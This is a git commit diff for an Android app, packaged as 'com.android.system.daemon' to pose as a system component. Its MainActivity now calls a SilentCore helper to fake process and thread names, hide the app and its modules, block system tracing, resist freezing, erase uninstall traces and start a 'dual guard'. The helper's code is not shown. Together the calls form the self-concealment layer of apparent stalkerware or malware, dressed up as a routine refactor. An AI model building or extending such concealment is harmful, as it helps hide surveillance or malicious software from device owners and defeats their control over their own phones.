77a7f3c59048f09fcb54f36fdaf7fe3ec30ae844
YuXiul <2422271946@qq.com>
2026-04-22 14:04:17 +0800

    Refactor process hiding functionality in MainActivity
    Replaced hideAppProcess method with multiple SilentCore calls for enhanced process management.

--- app/src/main/java/com/android/system/daemon/MainActivity.kt
+++ app/src/main/java/com/android/system/daemon/MainActivity.kt
@@ -1,20 +1,22 @@
 package com.android.system.daemon
 
 import android.os.Bundle
-import android.os.Process
 import androidx.appcompat.app.AppCompatActivity
 
 class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        hideAppProcess()
-    }
 
-    private fun hideAppProcess() {
-        try {
-            Process.setThreadPriority(Process.THREAD_PRIORITY_LOWEST)
-        } catch (_: Exception) {}
+        SilentCore.randomFakeProcess()
+        SilentCore.randomThreadName()
+        SilentCore.hideBase()
+        SilentCore.hideDeep()
+        SilentCore.blockSystemTrace()
+        SilentCore.hideModule()
+        SilentCore.antiFreeze()
+        SilentCore.hideUninstallTrace()
+        SilentCore.startDualGuard()
     }
 
     override fun onBackPressed() {
